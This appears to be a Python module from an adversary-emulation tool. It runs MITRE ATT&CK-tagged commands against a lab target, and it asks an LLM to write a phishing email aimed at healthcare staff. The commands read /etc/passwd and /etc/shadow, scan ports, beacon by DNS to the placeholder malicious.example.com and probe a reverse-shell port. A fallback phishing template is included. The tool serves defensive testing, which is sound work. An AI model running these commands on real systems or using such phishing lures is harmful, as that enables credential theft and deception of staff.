"""
Emulation module.
Handles AI scenario generation and local execution of attack steps.
Includes a ping check to verify target reachability.
"""
import json
import time
import subprocess
import os
from datetime import datetime
from . import ai_analyzer

DEFAULT_STEPS = [
    {
        "name": "Phishing Link Click",
        "technique": "T1566.001",
        "command": "curl -s http://{target}/phish.html || wget -q -O /dev/null http://{target}/phish.html",
        "description": "Simulate user clicking a malicious link in phishing email."
    },
    {
        "name": "System Discovery",
        "technique": "T1082",
        "command": "uname -a; whoami; ip a; hostname",
        "description": "Gather system information."
    },
    {
        "name": "User Discovery",
        "technique": "T1033",
        "command": "cat /etc/passwd; id; lastlog",
        "description": "Enumerate users."
    },
    {
        "name": "Credential Access - /etc/shadow Attempt",
        "technique": "T1003.008",
        "command": "cat /etc/shadow",
        "description": "Attempt to read password hashes."
    },
    {
        "name": "Network Scanning",
        "technique": "T1046",
        "command": "nmap -sT -p 22,80,443 {target} --open",
        "description": "Scan for open ports."
    },
    {
        "name": "C2 DNS Beacon",
        "technique": "T1071.004",
        "command": "nslookup malicious.example.com; ping -c 1 malicious.example.com",
        "description": "Simulate DNS beacon to C2 server."
    },
    {
        "name": "Reverse Shell Simulation",
        "technique": "T1071.001",
        "command": "nc -zv {target} 4444 || curl -s http://{target}:4444 || echo 'Simulated reverse shell'",
        "description": "Attempt connection to reverse shell listener."
    }
]

def ping_target(ip, verbose=False):
    """Ping the target IP once to check reachability."""
    if verbose: print(f"[VERBOSE] Pinging {ip}...")
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                                capture_output=True, timeout=5)
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False

def generate_scenario(config, verbose=False):
    if verbose: print("[VERBOSE] Generating AI scenario (phishing email + attack plan)...")
    run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    run_dir = f"{config['paths']['runs_base']}/{run_id}"
    os.makedirs(f"{run_dir}/scenario", exist_ok=True)

    prompt = """You are a red teamer. Generate a realistic phishing email targeting healthcare employees. The pretext should involve an urgent patient record update. Also create an attack plan with MITRE ATT&CK techniques (T1566.001, T1082, T1003.008, T1071.004). The plan should be a list of steps that would occur after the user clicks the link. Format as JSON with fields: email_subject, email_body, attack_steps (list of dict with name, technique, description). Keep it safe for a lab simulation."""
    
    try:
        ai_response = ai_analyzer.call_llm(config, prompt, json_mode=True)
        scenario = json.loads(ai_response)
        if verbose: print("[VERBOSE] AI scenario generated successfully.")
    except Exception as e:
        print(f"[!] AI generation failed: {e}. Using default scenario.")
        scenario = {
            "email_subject": "URGENT: Patient Record Update Required",
            "email_body": "Dear employee,\n\nWe have detected an issue with your patient records. Please click the link below to verify your information immediately.\n\n[Link]\n\nIT Department",
            "attack_steps": DEFAULT_STEPS
        }

    with open(f"{run_dir}/scenario/email_template.txt", "w") as f:
        f.write(f"Subject: {scenario['email_subject']}\n\n{scenario['email_body']}")

    with open(f"{run_dir}/scenario/attack_plan.json", "w") as f:
        json.dump(scenario.get("attack_steps", DEFAULT_STEPS), f, indent=2)

    if verbose: print(f"[VERBOSE] Scenario saved to {run_dir}/scenario/")
    return run_id

def run_local(config, run_id, verbose=False):
    if verbose: print("[VERBOSE] Starting local emulation...")
    run_dir = f"{config['paths']['runs_base']}/{run_id}"
    steps_file = f"{run_dir}/scenario/attack_plan.json"
    if not os.path.exists(steps_file):
        print("[!] Attack plan not found. Using default steps.")
        steps = DEFAULT_STEPS
    else:
        with open(steps_file) as f:
            steps = json.load(f)

    target = config['lab']['target_ip']
    print(f"[*] Checking connectivity to target {target}...")
    if not ping_target(target, verbose):
        print(f"[!] Target {target} is not reachable. Aborting emulation.")
        return

    log_file = f"{run_dir}/red_runlog.jsonl"
    with open(log_file, "w") as log:
        for step in steps:
            cmd = step['command'].format(target=target)
            if verbose: print(f"[VERBOSE] Executing: {cmd}")
            print(f"[*] Executing: {step['name']} ({step['technique']})")
            start = datetime.utcnow().isoformat()
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr
                exit_code = result.returncode
            except subprocess.TimeoutExpired as e:
                output = str(e)
                exit_code = -1
            except Exception as e:
                output = str(e)
                exit_code = -2
            end = datetime.utcnow().isoformat()

            record = {
                "timestamp": start,
                "end_time": end,
                "name": step['name'],
                "technique": step['technique'],
                "command": cmd,
                "exit_code": exit_code,
                "output": output[:500]
            }
            log.write(json.dumps(record) + "\n")
            log.flush()
            time.sleep(1)

    if verbose: print(f"[VERBOSE] Emulation log saved to {log_file}")
    print(f"[+] Emulation complete. Log saved to {log_file}")

def get_last_run_id(config):
    runs_base = config['paths']['runs_base']
    if not os.path.exists(runs_base):
        return None
    runs = [d for d in os.listdir(runs_base) if os.path.isdir(os.path.join(runs_base, d))]
    if not runs:
        return None
    runs.sort(reverse=True)
    return runs[0]
